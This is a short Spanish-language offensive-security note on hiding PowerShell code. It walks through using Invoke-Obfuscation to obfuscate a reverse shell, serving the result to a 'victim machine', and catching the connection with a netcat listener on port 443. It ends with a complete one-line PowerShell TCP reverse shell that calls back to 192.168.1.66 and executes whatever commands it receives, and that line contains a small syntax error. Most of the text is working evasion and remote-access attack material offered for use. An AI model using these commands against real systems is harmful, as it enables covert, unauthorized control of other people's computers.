# Ocultamiento de código en Powershell

Tags: #Powershell 

## Ofuscación con Powershell

Funciona en Windows 10 desactivando (Cloud-delivered protection, Automatic sample submission)

```bash 
https://github.com/danielbohannon/Invoke-Obfuscation
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell
```

```bash 
# Debemos de clonarnos el repo anterior y dentro de Powershell hacer lo siguiente. 

❯ apt install powershell -y                            # Instalamos Powershell

❯ pwsh                                                 # Iniciamos Powershell en Linux
	❯ cd ./Invoke-obfuscation/ 
	❯ Import-Module ./Invoke-Obfuscation.psd1         # Importamos el modulo 
	❯ cd ..
	❯ Invoke-Obfuscation                              # Ejecutamos e iniciamos Invoke-Obfuscation

# Dentro de Invoke-Obfuscation
	❯ SET SCRIPTPATH /home/kali/shell.ps1             # Colocamos el tipo de Shell y la ruta absoluta de donde se encuentra
	❯ ENCODING 
		❯ 1                                          # 1 Tipo = ASCII
	❯ BACK
	❯ AST
		❯ ALL
			❯ 1
# Nos creara un nuevo archivo llamado 
❯ obfuscated.ps1                                      # Este archivo lo debemos de pasar por un servidor python y despues ejecutarlos en la maquina victima
❯ nc -nlvp 443                                        # Nos ponemos en modo escucha en la maquina de atacante para recibir la Reverse shell
```

```bash 
# Crearemos una Revershell  que la llamaremos shell.ps1, el cual colocaremos en la sig. ruta:
	# '/usr/share/windows-resources/shellter'

❯ $client = New-Object System.Net.Sockets.TCPClient('192.168.1.66',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =  [text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```